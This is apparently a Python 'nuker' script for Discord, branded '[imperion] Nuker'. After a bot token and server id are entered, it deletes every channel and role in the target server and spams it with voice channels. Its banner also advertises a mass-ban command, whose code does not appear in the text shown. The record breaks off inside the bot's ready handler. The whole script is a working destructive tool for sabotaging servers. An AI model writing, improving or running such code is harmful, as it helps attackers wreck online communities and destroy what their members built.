import discord
import os
import ctypes
import threading
from discord.ext import commands
import requests
from colorama import Fore, init
import yaml
import time
import random, sys
init(autoreset=True)

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')
def title(content):
    try: ctypes.windll.kernel32.SetConsoleTitleW(content)
    except: pass

purp = Fore.MAGENTA 
pink = Fore.LIGHTMAGENTA_EX 
gray = Fore.LIGHTBLACK_EX 
whit = Fore.WHITE 
red = Fore.RED 
lred = Fore.LIGHTRED_EX 

cls()
title("[imperion] Nuker")
print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
print(f"""
{red}                                                                            
{red}                                         _                        _           
{red}                                        <_>._ _ _  ___  ___  _ _ <_> ___ ._ _ 
{red}                                        | || ' ' || . \/ ._>| '_>| |/ . \| ' |
{red}                                        |_||_|_|_||  _/\___.|_|  |_|\___/|_|_|
{red}                                                  |_|          {gray}           By Niju                         
{red}                                       
{red}                                                         
""")
print(f"{pink}>{red} $nuke to nuke and $ban for massban")

async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
    return deleted


async def create_voice_channels(guild, name):
    created = 0
    for _ in range(200 - len(guild.channels)):
        try:
            await guild.create_voice_channel(name=name)
            created += 1
        except:
            continue
    return created

async def nuke(guild):
    print(f'{red}Nuke: {pink}{guild.name}')
    deleted_channels = await delete_all_channel(guild)
    print(f'{pink}Delete Channels:{pink}{deleted_channels}')
    delete_roles = await delete_all_roles(guild)
    print(f'{pink}Delete Roles:{pink}{delete_roles}')
    created_channels = await create_voice_channels(guild,name)
    print(f'{pink}Create Voice Channels:{pink}{created_channels}')
    print(f'{pink}--------------------------------------------\n\n')


while True:
    token = input(f'{pink}Input bot token:{pink}')
    name = input(f'{pink}Input name for created channels / roles:{pink}')
    client = commands.Bot(command_prefix='$',intents=discord.Intents.all())
    guild_id =  input(f'{whit}Input server id:{lred}')
    @client.event
    async def on_ready():
        for guild in client.guilds:
         if str(guild.id) == guild_id:
          await nuke(guild)